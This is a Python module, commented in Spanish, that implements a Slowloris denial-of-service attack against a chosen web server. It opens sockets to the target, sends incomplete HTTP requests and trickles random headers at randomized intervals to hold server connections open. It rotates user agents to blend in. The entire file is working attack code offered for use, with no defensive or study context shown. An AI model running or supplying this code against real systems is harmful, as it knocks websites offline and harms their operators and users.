#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Slowloris Attack Module
Mantiene conexiones HTTP abiertas el máximo tiempo posible
"""

import socket
import random
import time
import string


class Slowloris:
    """Implementa ataque Slowloris"""

    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
    ]

    def __init__(self, target, port=80, timeout=30):
        """
        Inicializa el ataque Slowloris
        
        Args:
            target: IP o dominio objetivo
            port: Puerto objetivo (default 80)
            timeout: Timeout de socket (default 30)
        """
        self.target = target
        self.port = port
        self.timeout = timeout
        self.sockets = []

    def _get_random_user_agent(self):
        """Retorna un User-Agent aleatorio"""
        return random.choice(self.USER_AGENTS)

    def _build_http_header(self):
        """Construye un encabezado HTTP incompleto"""
        headers = [
            f"GET / HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: {self._get_random_user_agent()}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            f"Referer: http://{self.target}/",
            "DNT: 1",
        ]
        return "\r\n".join(headers) + "\r\n"

    def send_slow_request(self):
        """
        Envía una solicitud HTTP lenta
        Mantiene la conexión abierta enviando headers incompletos
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            # Conectar
            sock.connect((self.target, self.port))

            # Enviar headers incompletos
            headers = self._build_http_header()
            sock.sendall(headers.encode())

            # Enviar headers adicionales lentamente
            while True:
                try:
                    # Enviar un header aleatorio cada cierto tiempo
                    header_name = ''.join(random.choices(string.ascii_letters, k=10))
                    header_value = ''.join(random.choices(string.ascii_letters, k=20))
                    
                    sock.sendall(f"{header_name}: {header_value}\r\n".encode())
                    
                    # Esperar antes de enviar el siguiente
                    time.sleep(random.uniform(5, 15))

                except socket.timeout:
                    break
                except (BrokenPipeError, ConnectionResetError):
                    break

            sock.close()
            return True

        except socket.timeout:
            return False
        except ConnectionRefusedError:
            raise Exception(f"Conexión rechazada por {self.target}:{self.port}")
        except socket.gaierror:
            raise Exception(f"No se puede resolver {self.target}")
        except Exception as e:
            raise Exception(f"Error en Slowloris: {e}")

    def maintain_connection(self, sock):
        """
        Mantiene una conexión abierta enviando headers incompletos
        
        Args:
            sock: Socket de conexión
        """
        try:
            while True:
                try:
                    # Enviar header aleatorio
                    header_name = ''.join(random.choices(string.ascii_letters, k=8))
                    header_value = ''.join(random.choices(string.ascii_letters, k=15))
                    
                    sock.sendall(f"{header_name}: {header_value}\r\n".encode())
                    
                    # Esperar tiempo aleatorio
                    time.sleep(random.uniform(10, 30))

                except (socket.timeout, BrokenPipeError, ConnectionResetError):
                    break

        except Exception as e:
            pass
        finally:
            try:
                sock.close()
            except:
                pass

    def create_connection(self):
        """Crea una nueva conexión lenta"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Enviar headers iniciales
            headers = self._build_http_header()
            sock.sendall(headers.encode())

            self.sockets.append(sock)
            return sock

        except Exception as e:
            raise Exception(f"Error creando conexión: {e}")

    def close_all_connections(self):
        """Cierra todas las conexiones abiertas"""
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()
